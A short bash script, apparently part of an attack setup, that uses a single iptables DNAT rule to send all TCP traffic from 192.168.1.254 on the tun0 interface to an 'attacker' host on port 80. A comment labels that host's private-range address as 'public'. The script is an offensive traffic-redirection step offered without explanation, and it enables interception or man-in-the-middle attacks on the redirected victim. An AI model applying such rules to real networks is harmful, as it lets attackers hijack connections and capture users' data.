#!/bin/bash

# Attacker's public IP
ATTACKER2=192.168.254.3
sudo iptables -t nat -A PREROUTING -i tun0 -p tcp -s 192.168.1.254 -j DNAT --to-destination $ATTACKER2:80
